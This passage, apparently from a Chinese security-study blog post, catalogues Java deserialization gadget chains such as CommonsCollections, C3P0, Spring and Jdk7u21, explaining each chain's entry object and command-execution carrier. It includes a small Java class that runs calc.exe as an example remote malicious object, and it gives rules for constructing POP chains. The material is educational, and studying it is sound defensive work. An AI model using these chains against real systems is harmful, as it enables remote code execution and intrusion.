<h3 id="BeanShell1"><a href="#BeanShell1" class="headerlink" title="BeanShell1"></a>BeanShell1</h3><p><font color="#0099ff">命令执行载体：</font><code>bsh.Interpreter</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code> 反序列化所有元素后，通过<code>comparator.compare()</code>进行排序，该<code>comparator</code>被代理给<code>XThis.Handler</code>处理，其<code>invoke()</code>会调用<code>This.invokeMethod()</code>从<code>Interpreter</code>解释器中解析包含恶意代码的<code>compare</code>方法并执行</p>
<h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p><font color="#0099ff">命令执行载体：</font><code>bsh.Interpreter</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>com.mchange.v2.c3p0.PoolBackedDataSource</code></p>
<p><code>PoolBackedDataSource.readObject()</code>进行到父类<code>PoolBackedDataSourceBase.readObject()</code>阶段，会调用<code>ReferenceIndirector$ReferenceSerialized.getObject()</code>获取对象，其中<code>InitialContext.lookup()</code>会去加载远程恶意对象并初始化，导致命令执行，有些同学可能不太清楚远程恶意对象的长相，举个简单的例子：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Malicious</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Malicious</span><span class="params">()</span> &#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h3><p><font color="#0099ff">命令执行载体：</font><code>clojure.core$comp$fn__4727</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>反序列化各元素时，通过它的<code>hashCode()</code>得到hash值，而<code>AbstractTableModel$ff19274a.hashCode()</code>会从<code>IPersistentMap</code>中取<code>hashCode</code>键的值对象调用其<code>invoke()</code>，最终导致Clojure Shell命令字符串执行</p>
<hr>
<h3 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>执行排序时，<code>BeanComparator.compare()</code>会根据<code>BeanComparator.property</code> <em>（值为<code>outputProperties</code>）</em> 调用<code>TemplatesImpl.getOutputProperties()</code>，它在<code>newTransformer()</code>时会创建<code>AbstractTranslet</code>实例，导致精心构造的Java字节码被执行</p>
<h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code><br>见前文</p>
<h3 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>InvokerTransformer.transform()</code>转换元素，进而获取第一个元素<code>TemplatesImpl</code>的<code>newTransformer()</code>并调用，最终导致命令执行</p>
<h3 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code></p>
<p>除<code>Transformer</code>数组元素组成不同外，与CommonsCollections1基本一致</p>
<h3 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>ChainedTransformer.transform()</code>转换元素，进而遍历执行<code>Transformer</code>数组中的每个元素，最终导致命令执行</p>
<h3 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>BadAttributeValueExpException</code></p>
<p><code>BadAttributeValueExpException.readObject()</code>当<code>System.getSecurityManager()</code>为<code>null</code>时，会调用<code>TiedMapEntry.toString()</code>，它在<code>getValue()</code>时会通过<code>LazyMap.get()</code>取值，最终导致命令执行</p>
<h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code><br><font color="#0099ff">反序列化载体：</font><code>HashSet</code><br><code>HashSet.readObject()</code>反序列化各元素后，会调用<code>HashMap.put()</code>将结果放进去，而它通过<code>TiedMapEntry.hashCode()</code>计算hash时，会调用<code>getValue()</code>触发<code>LazyMap.get()</code>导致命令执行</p>
<hr>
<h3 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.codehaus.groovy.runtime.MethodClosure</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code></p>
<p><code>AnnotationInvocationHandler.readObject()</code>在通过<code>memberValues.entrySet()</code>获取<code>Entry</code>集合，该<code>memberValues</code>被代理给<code>ConvertedClosure</code>拦截<code>entrySet</code>方法，根据<code>MethodClosure</code>的构造最终会由<code>ProcessGroovyMethods.execute()</code>执行系统命令</p>
<h3 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>通过<code>TypedValue.hashCode()</code>计算hash时，<code>ComponentType.getPropertyValue()</code>会调用<code>PojoComponentTuplizer.getPropertyValue()</code>获取到<code>TemplatesImpl.getOutputProperties</code>方法并调用导致命令执行</p>
<h3 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h3><p><font color="#0099ff">命令执行载体：</font><code>com.sun.rowset.JdbcRowSetImpl</code><br><font color="#0099ff">反序列化载体：</font><code>HashMap</code><br>执行过程与Hibernate1一致，但Hibernate2并不是传入<code>TemplatesImpl</code>执行系统命令，而是利用<code>JdbcRowSetImpl.getDatabaseMetaData()</code>调用<code>connect()</code>连接到远程RMI</p>
<hr>
<h3 id="JBossInterceptors1"><a href="#JBossInterceptors1" class="headerlink" title="JBossInterceptors1"></a>JBossInterceptors1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.jboss.interceptor.proxy.InterceptorMethodHandler</code></p>
<p><code>InterceptorMethodHandler.readObject()</code>在<code>executeInterception()</code>时，会根据<code>SimpleInterceptorMetadata</code>拿到<code>TemplatesImpl</code>放进<code>ArrayList</code>中，并传入<code>SimpleInterceptionChain</code>进行初始化，它在调用<code>invokeNextInterceptor()</code>时会导致命令执行</p>
<h3 id="JSON1"><a href="#JSON1" class="headerlink" title="JSON1"></a>JSON1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>将各元素放进<code>HashMap</code>时，会调用<code>TabularDataSupport.equals()</code>进行比较，它的<code>JSONObject.containsValue()</code>获取对象后在<code>PropertyUtils.getProperty()</code>内动态调用<code>getOutputProperties</code>方法，它被代理给<code>CompositeInvocationHandlerImpl</code>，其中转交给<code>JdkDynamicAopProxy.invoke()</code>，在<code>AopUtils.invokeJoinpointUsingReflection()</code>时会传入从<code>AdvisedSupport.target</code>字段中取出来的<code>TemplatesImpl</code>，最终导致命令执行</p>
<h3 id="JavassistWeld1"><a href="#JavassistWeld1" class="headerlink" title="JavassistWeld1"></a>JavassistWeld1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.jboss.weld.interceptor.proxy.InterceptorMethodHandler</code></p>
<p>除JBoss部分包名存在差异外，与JBossInterceptors1基本一致</p>
<h3 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>LinkedHashSet</code></p>
<p><code>LinkedHashSet.readObject()</code>将各元素放进<code>HashMap</code>时，第二个元素会调用<code>equals()</code>与第一个元素进行比较，它被代理给<code>AnnotationInvocationHandler</code>进入<code>equalsImpl()</code>，在<code>getMemberMethods()</code>遍历<code>TemplatesImpl</code>的方法遇到<code>getOutputProperties</code>进行调用时，导致命令执行</p>
<hr>
<h3 id="MozillaRhino1"><a href="#MozillaRhino1" class="headerlink" title="MozillaRhino1"></a>MozillaRhino1</h3><p> <font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p> <font color="#0099ff">反序列化载体：</font><code>BadAttributeValueExpException</code></p>
<p> <code>BadAttributeValueExpException.readObject()</code>调用<code>NativeError.toString()</code>时，会在<code>ScriptableObject.getProperty()</code>中进入<code>getImpl()</code>，<code>ScriptableObject$Slot</code>根据<code>name</code>获取到封装了<code>Context.enter</code>方法的<code>MemberBox</code>，并通过它的<code>invoke()</code>完成调用，而之后根据<code>message</code>调用<code>TemplatesImpl.newTransformer()</code>则会导致命令执行</p>
<h3 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>通过<code>ValueExpressionMethodExpression.hashCode()</code>计算hash时，会由<code>getMethodExpression()</code>调用<code>ValueExpression.getValue()</code>，最终导致EL表达式执行</p>
<h3 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code><br><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p>执行过程与Myfaces1一致，但Myfaces2的EL表达式并不是由使用者传入的，而是预制了一串加载远程恶意对象的表达式</p>
<h3 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>通过<code>ObjectBean.hashCode()</code>计算hash时，会在<code>ToStringBean.toString()</code>阶段遍历<code>TemplatesImpl</code>所有字段的Setter和Getter并调用，当调用到<code>getOutputProperties()</code>时将导致命令执行</p>
<hr>
<h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p>
<p><code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>在调用<code>TypeProvider.getType()</code>时被代理给<code>AnnotationInvocationHandler</code>得到另一个Handler为<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>的代理，之后传给<code>ReflectionUtils.invokeMethod()</code>动态调用<code>newTransformer</code>方法时被第二个代理拦截，它的<code>objectFactory</code>字段是第三个代理，因此<code>objectFactory.getObject()</code>会获得<code>TemplatesImpl</code>，最终导致命令执行</p>
<h3 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h3><p> <font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p>
<p> <code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>在动态调用<code>newTransformer</code>方法时，被第二个代理拦截交给<code>JdkDynamicAopProxy</code>，它在<code>AopUtils.invokeJoinpointUsingReflection()</code>时会传入从<code>AdvisedSupport.targetSource</code>字段中取出来的<code>TemplatesImpl</code>，最终导致命令执行</p>
<p>根据上面这些内容，我们可以得到几条简单的POP构造法则：</p>
<ol>
<li>当依赖中不存在可以执行命令的方法时，可以选择使用<code>TemplatesImpl</code>作为命令执行载体，并想办法去触发它的<code>newTransformer</code>或<code>getOutputProperties</code>方法</li>
<li>可以作为入口的通用反序列化载体是<code>HashMap</code>、<code>AnnotationInvocationHandler</code>、<code>BadAttributeValueExpException</code>和<code>PriorityQueue</code>，它们都是依赖较少的JDK底层对象，区别如下：<ul>
<li><code>HashMap</code>，可以主动触发元素的<code>hashCode</code>和<code>equals</code>方法</li>
<li><code>AnnotationInvocationHandler</code>，可以主动触发<code>memberValues</code>字段的<code>setValue</code>方法，本身也可以作为动态代理的Handler拦截如<code>Map.entrySet</code>等方法进入自己的<code>invoke</code>方法</li>
<li><code>BadAttributeValueExpException</code>，可以主动触发<code>val</code>字段的<code>toString</code>方法</li>
<li><code>PriorityQueue</code>，可以主动触发<code>comparator</code>字段的<code>compare</code>方法</li>
</ul>
</li>
</ol>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>历年来，很多流行的Java组件框架都被爆出过反序列化漏洞，这已经有好多大牛们都进行过分析总结了，本文的主要目的也不在此，而是为了去深挖反序列化漏洞底层一些可能还没有被唤醒的地方。</p>
<p>不过有一点要切记，反序列化不止RCE。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://docs.oracle.com/javase/8/docs/">JavaSE Document</a></li>
<li><a href="http://hg.openjdk.java.net/">Java OpenJDK Source Code</a></li>
<li><a href="https://github.com/unofficial-openjdk/openjdk/">Java OpenJDK GitHub Mirror</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>code audit</tag>
      </tags>
  </entry>
</search>
